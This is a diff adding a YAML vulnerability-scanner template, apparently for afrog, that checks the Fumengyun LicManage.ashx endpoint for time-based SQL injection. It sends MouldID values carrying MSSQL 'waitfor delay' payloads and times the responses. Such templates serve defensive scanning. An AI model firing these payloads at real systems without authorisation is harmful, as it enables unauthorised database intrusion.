@@ -1,0 +1,44 @@
+id: fumengyun-licmanage-sqli
+
+info:
+  name: 孚盟云LicManage SQL注入
+  author: zan8in
+  severity: critical
+  verified: true
+  tags: fumengyun,sqli
+  created: 2025/01/06
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /Ajax/LicManage.ashx?action=ExtensionPermit&BillFID=1&MouldID=1'+waitfor+delay+'0:0:6'--+
+    expression: |
+      response.status == 200 && 
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+  r1:
+    request:
+      method: GET
+      path: /Ajax/LicManage.ashx?action=ExtensionPermit&BillFID=1&MouldID=1'+waitfor+delay+'0:0:10'--+
+    expression: |
+      response.status == 200 && 
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r2:
+    request:
+      method: GET
+      path: /Ajax/LicManage.ashx?action=ExtensionPermit&BillFID=1&MouldID=1'+waitfor+delay+'0:0:6'--+
+    expression: |
+      response.status == 200 && 
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+  r3:
+    request:
+      method: GET
+      path: /Ajax/LicManage.ashx?action=ExtensionPermit&BillFID=1&MouldID=1'+waitfor+delay+'0:0:10'--+
+    expression: |
+      response.status == 200 && 
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+expression: r0() && r1() && r2() && r3()
